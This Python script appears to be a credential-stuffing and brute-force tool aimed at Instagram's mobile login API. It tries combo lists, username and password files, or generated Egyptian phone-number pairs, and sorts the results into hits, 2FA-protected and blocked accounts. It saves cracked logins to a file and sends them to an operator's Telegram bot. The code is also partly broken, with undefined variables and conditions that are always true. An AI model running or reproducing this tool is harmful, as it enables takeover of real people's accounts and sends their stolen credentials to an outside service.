import os
from time import sleep
os.system("title " + " #team el gen Welcome Bro ðŸ”¥ - @B_1_2_4")
clear = lambda : os.system('cls')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()
try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()
try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
try:
    import random
except ImportError:
    os.system('pip install random')
    import random
    clear()
color3 = fg(2)
color4 = fg('9')    

def close():
    input('- Press Enter To Exit /')
    sys.exit()

clear()
os.system('color a')
def banner():
    print(""" 
           By â€¢ @SH4FO    | By â€¢ @SH4FO
    WELOCOME TO TEAM EROR FAMILY WELCOME""")
    sleep(0.50)
    print("    WELOCOME TO SCRIPT SH4FO  WELCOME")
    sleep(0.50)
    print("""    WELOCOME TO SH4FO EROR  WELCOME""")
    sleep(0.50)
    print(""" WELOCOME TO SH4FO 404  WELCOME
    WELOCOME TO TEAM SH4FO 404 WELCOME""")
banner()
print("")
print("\n[!]  ")
h , b,s,block = 0,0,0,0
tele = input("[+] Send Hits To Telegram YES/N ?: ")
if "YES" in tele:
    id = input("[+] Enter Your ID Tele : ")
    bot = input("[+] Enter Token Bot : ")
elif "y" in tele:
    id = input("[+] Enter Your ID Tele : ")
    bot = input("[+] Enter Token Bot : ")
print("==========================")
ask = input("""[1] Check By Combo
[2] Check By users File Pass file
[3] Check Auto Num:Num
==========================
[+] Please Select Mode : """)
if ask == "3":
   
    make = '0123456789'
    clear()
    banner()
    print("")
    print(f"\r              TEAM EROR    [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

    while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = '+20111' + us
        pasw = '0111' + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "YES" or "yes" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello TEAM EL GEN Account Hited\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @B_1_2_4_BY @B_1_2_4")
            open("HitedMAys Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                  [=]Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
elif ask =="2":
    clear()
    banner()
    print("")
    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    user = open("Users.txt","r").read().splitlines()  
    pasw = open("Pass.txt","r").read().splitlines()    
    for u in user:
        for p in pasw:    
            req = requests.session()
            log_head = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Cookie': 'missing',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'}
            uid = str(uuid4())
            log_data = {
                'uuid': uid,
                'password': p,
                'username': u,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'}
            r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
            #print(r.text)
            if "logged_in_user" in r.text:
                  if "YES" or "yes" in tele:
                    t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello New Account Hited\n====================\n[=] User : {u} \n[=] Pass : {p}\n====================\MYCh : @B_1_2_4 BY @B_1_2_4")
         
                    open("HitedMays Accounts.txt","a").write(f"{u}:{p}\n")
                    h += 1
                    print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'challenge_required' in log.text:
                s += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
                open("Scure.txt","w").write(f"{user}:{pasw}\n")
            elif 'Please wait a few minutes' in log.text:
                block += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            elif 'Bad request' in log.text:
                b += 1
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
            else:
                b+=1    
                print(f"\r                  [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
#==================================================================
elif ask =="1":
    assk = input("[+] File combo dane : ")
    if '.txt' in assk:
        pass
    else:
        assk  = assk + '.txt'
    clear()
    banner()
   
    print("")
    print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
    acc = open(assk,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "YES" or "yes" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=Hello Maystro Account Hited\n====================\n[=] User : {user} \n[=] Pass : {pasw}\n====================\nCh : @B_1_2_4 BY @B_1_2_4")
         
            open("HitedMays Accounts.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r                   [=] Hit : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')

